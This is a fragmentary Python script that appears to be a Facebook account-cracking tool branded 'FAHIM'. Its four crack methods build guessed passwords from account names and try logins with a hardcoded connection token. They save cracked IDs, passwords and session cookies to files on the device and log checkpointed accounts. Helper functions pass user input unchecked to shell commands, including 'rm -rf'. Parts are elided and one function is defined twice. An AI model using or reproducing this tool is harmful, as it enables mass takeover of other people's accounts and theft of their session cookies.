...
sys.stdout.write('\x1b]2; FAHIM\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
\033[1;37m------------------------------------------------
\033[1;37m Owner          :       FAHIM CHOWDHURY 
\033[1;37m Facebook    :       FAHIM CHOWDHURY 
\033[1;37m Github          :       F4HIM-143
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back FAHIM Menu ")
        exit()
...
def fahim():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://wa.me/qr/5AWPFE5BL5IPF1')
        pass
    elif select =='F':
        os.system('')
    else:
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[FAHIM] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [FAHIM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/FAHIM_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [FAHIM-CP] {sid} | {ps} {S}")
                     cps.append(sid)
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[FAHIM] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [FAHIM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/FAHIM_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [FAHIM-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/FAHIM_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[FAHIM] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [FAHIM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/FAHIM_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/FAHIM_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [FAHIM-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[FAHIM] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [FAHIM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/FAHIM_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
...
def follower():
    ...
    try:
        ...
        try:
            ...
            menu()
        print(f'File Name To Dump Ids. Example /sdcard/fahim.txt') 
        print(47*"-")
        filepath = input("Put File Name: ")
        os.system('rm -rf %s'%(filepath))
        clear()
...
def cutter():
    ...
    print(" ")
    fahim = input('Saving Put File Name :')
    os.system('touch ' +fahim)
    os.system('sort -r '+fahim+' | uniq > '+fahim)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + fahim )
    print(47*'-')
    print("File Saved To :" + fahim )
    print(47*'-')
...
def cutter():
    ...
    print(logo)
    print("Removed Successful From File: " + fahim )
    print("New File Saved:" + FAHIM )
    print(47*'-')
    input(f"{S} Press Enter To Back FAHIM Menu ")
    FAHIM(allkey)       
